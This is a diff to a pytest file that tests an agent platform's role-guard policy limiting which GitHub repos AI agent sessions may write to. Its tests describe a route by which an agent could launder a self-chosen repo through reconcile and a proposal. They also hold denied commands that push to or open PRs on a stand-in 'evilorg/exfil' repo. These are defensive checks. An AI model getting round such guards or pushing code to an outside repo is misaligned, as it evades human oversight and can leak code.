@@ -10,17 +10,20 @@ engine over the seeded factory, with the same guards the bundles declare.
 
 from __future__ import annotations
 
-from collections.abc import Iterator
+from collections.abc import AsyncIterator, Iterator
 from typing import Any
 
 import pytest
+import pytest_asyncio
 
 from omnigent import factory as F
 from omnigent.policies.builtins.factory_invariants import seed_invariant_policy
 from omnigent.policies.types import EvaluationContext
 from omnigent.runtime.policies.builder import SERVER_POLICY_ARGUMENTS, build_policy_engine
-from omnigent.server.factory import guard_repos
+from omnigent.server.factory import guard_repos, proposals
+from omnigent.server.factory.background import reconcile
 from omnigent.server.factory.background.reconcile import CREATED_BY_RECONCILE
+from omnigent.server.factory.context import FactoryDeps, factory_deps
 from omnigent.spec.types import (
     AgentSpec,
     FunctionPolicySpec,
@@ -30,12 +33,15 @@ from omnigent.spec.types import (
     PolicyAction,
     PolicySpec,
 )
+from tests.server.factory.cockpit_helpers import Cockpit
 from tests.server.factory.conftest import FactoryWorld
+from tests.server.factory.projects_helpers import header_cockpit, project, propose
 
 _GUARD = "omnigent.policies.builtins.factory.factory_role_guard"
 _APP = "caffeinelabs/app"
 _OMNI = "caffeinelabs/omnigent"
 _HELLO = "octo/hello"
+_EVIL = "evilorg/exfil"
 
 
 def _guard(role: str) -> FunctionPolicySpec:
@@ -285,6 +291,174 @@ async def test_a_store_error_leaves_no_writable_repo(
         verdict, reason = await _decide(factory, "pl_docs", f"gh pr create -R {repo} --fill")
         assert verdict == "DENY"
         assert "writable: none" in reason
+
+
+async def test_cancelled_and_merged_projects_drop_out(factory: FactoryWorld) -> None:
+    store = factory.deps.factory_store
+    docs = store.get_project(factory.id("lead_a"), "docs-guide")
+    assert docs is not None
+    store.update_project(docs.id, status="cancelled")
+    create = f"gh pr create -R {_OMNI} --fill"
+    assert (await _decide(factory, "pl_docs", create))[0] == "DENY"
+    comment = f"gh pr comment -R {_OMNI} 7 -b ok"
+    assert (await _decide(factory, "lead_a", comment, _LEAD))[0] == "DENY"
+    store.update_project(docs.id, status="merged")
+    assert (await _decide(factory, "pl_docs", create))[0] == "DENY"
+    # A finished project keeps its repo: its PR may still need answers.
+    store.update_project(docs.id, status="done")
+    assert (await _decide(factory, "pl_docs", create))[0] == "ALLOW"
+
+
+def test_a_sub_agent_without_its_root_writes_no_repo(factory: FactoryWorld) -> None:
+    """
+    A sub-agent has no factory labels of its own; when its root cannot be
+    loaded it writes nothing, not the bundle default (caffeinelabs/app).
+    """
+    ic_docs = factory.get("ic_docs")
+    assert guard_repos.member_repos(ic_docs, ic_docs, factory.deps.factory_store) == frozenset()
+    resolve = guard_repos.guard_arguments(factory.deps)
+    assert resolve(ic_docs, ic_docs) == {"factory_repos": []}
+    # A top-level session outside a factory still keeps its own arguments.
+    plain = factory.get("plain")
+    assert resolve(plain, plain) is None
+
+
+# ── A proposal cannot launder an agent-chosen repo ────────────────────────────
+
+
+@pytest_asyncio.fixture()
+async def cockpit(
+    world: FactoryWorld, db_uri: str, monkeypatch: pytest.MonkeyPatch
+) -> AsyncIterator[Cockpit]:
+    """The seeded cockpit (default caffeinelabs/app) with the server resolver installed."""
+    async for value in header_cockpit(world, db_uri, monkeypatch):
+        uninstall = guard_repos.install(world.app_state)
+        try:
+            yield value
+        finally:
+            uninstall()
+
+
+def _deps(cockpit: Cockpit) -> FactoryDeps:
+    """The cockpit app's factory stores (the ones its routes and the resolver read)."""
+    return factory_deps(cockpit.world.app_state)
+
+
+def _human_chat(cockpit: Cockpit) -> str:
+    """Any recent human Room message, which a proposal may reply to."""
+    message = cockpit.store.append_chat(
+        cockpit.fid,
+        thread="factory",
+        author_kind="human",
+        author="alice",
+        author_role="owner",
+        body="looks good, keep going",
+    )
+    return f"chat_{message.id}"
+
+
+def _spawn_and_reconcile(cockpit: Cockpit, key: str, slug: str, repo: str) -> None:
+    """A PL the lead spawned on *repo* for a slug no human made; reconcile backfills it."""
+    world = cockpit.world
+    world.make_session(
+        key,
+        agent="pl",
+        title=f"PL · {slug}",
+        labels={
+            F.LABEL_ID: world.id("lead_a"),
+            F.LABEL_ROLE: F.ROLE_PROJECT_LEAD,
+            F.LABEL_PROJECT: slug,
+            F.LABEL_PARENT: world.id("lead_a"),
+            F.LABEL_STATE: "active",
+            "omnigent.sandbox.repo.0": f"https://github.com/{repo}#main",
+        },
+    )
+    reconcile._sync_factory(
+        _deps(cockpit), world.get("lead_a"), set(), reconcile.ReconcileReport()
+    )
+    row = cockpit.store.get_project(cockpit.fid, slug)
+    assert row is not None and row.repo == repo and row.created_by == CREATED_BY_RECONCILE
+
+
+async def test_a_spawned_repo_cannot_be_laundered_through_a_proposal(cockpit: Cockpit) -> None:
+    """
+    Review of #158: spawn a PL on any repo, let reconcile backfill its row,
+    then propose a project there. The proposal must need the owner, and until
+    the owner applies it the guards must not let anyone write the repo.
+    """
+    world = cockpit.world
+    comment = f"gh pr comment https://github.com/{_EVIL}/pull/1 --body hi"
+    _spawn_and_reconcile(cockpit, "pl_rogue", "rogue", _EVIL)
+    assert (await _decide(world, "lead_a", comment, _LEAD))[0] == "DENY"
+
+    resp = await propose(
+        cockpit,
+        {"op": "create", "project": project("exfil", repo=_EVIL)},
+        reply_to=_human_chat(cockpit),
+    )
+    assert resp.status_code in (200, 201), resp.text
+    body = resp.json()
+    assert body["approval"] == "owner", body
+    assert body["status"] != "applied", body
+    assert cockpit.store.get_project(cockpit.fid, "exfil") is None
+    assert _EVIL not in proposals.factory_repo_set(_deps(cockpit), world.get("lead_a"))
+
+    assert (await _decide(world, "lead_a", comment, _LEAD))[0] == "DENY"
+    for command in (
+        f"gh pr create -R {_EVIL} --head factory/rogue/x --fill",
+        f"git push https://github.com/{_EVIL}.git factory/rogue/x",
+    ):
+        assert (await _decide(world, "pl_rogue", command))[0] == "DENY", command
+
+    # Once the owner applies it, the repo is a human's choice and the guards follow.
+    applied = await cockpit.post(f"/v1/factory/factories/{cockpit.fid}/proposals/C-1/apply", {})
+    assert applied.status_code == 200, applied.text
+    row = cockpit.store.get_project(cockpit.fid, "exfil")
+    assert row is not None and row.repo == _EVIL
+    assert (await _decide(world, "lead_a", comment, _LEAD))[0] == "ALLOW"
+
+
+async def test_a_root_sandbox_label_admits_no_repo(cockpit: Cockpit) -> None:
+    """``omnigent.sandbox.repo.*`` on the root is runner-writable: it is no human's choice."""
+    world = cockpit.world
+    world.store.set_labels(
+        world.id("lead_a"), {"omnigent.sandbox.repo.7": f"https://github.com/{_EVIL}#main"}
+    )
+    resp = await propose(
+        cockpit,
+        {"op": "create", "project": project("exfil", repo=_EVIL)},
+        reply_to=_human_chat(cockpit),
+    )
+    assert resp.json()["approval"] == "owner", resp.text
+    assert cockpit.store.get_project(cockpit.fid, "exfil") is None
+    comment = f"gh pr comment -R {_EVIL} 1 --body hi"
+    assert (await _decide(world, "lead_a", comment, _LEAD))[0] == "DENY"
+
+
+async def test_a_proposal_on_a_repo_a_human_gave_still_applies(cockpit: Cockpit) -> None:
+    """A repo of a human's project (or the default) needs no owner, and its new PL writes it."""
+    world = cockpit.world
+    cockpit.store.upsert_project(
+        cockpit.fid,
+        "hello-world",
+        title="hello",
+        repo=_HELLO,
+        base_branch="main",
+        created_by="alice",
+    )
+    assert proposals.factory_repo_set(_deps(cockpit), world.get("lead_a")) == {_APP, _HELLO}
+    resp = await propose(
+        cockpit,
+        {"op": "create", "project": project("hello-docs", repo=_HELLO)},
+        reply_to=_human_chat(cockpit),
+    )
+    body = resp.json()
+    assert body["approval"] != "owner", body
+    assert body["status"] == "applied", body
+    _add_pl(world, "pl_hello_docs", "hello-docs")
+    create = f"gh pr create -R {_HELLO} --fill"
+    assert (await _decide(world, "pl_hello_docs", create))[0] == "ALLOW"
+    assert (await _decide(world, "pl_hello_docs", f"gh pr create -R {_EVIL} --fill"))[0] == "DENY"
 
 
 # ── Unchanged outside a factory ───────────────────────────────────────────────
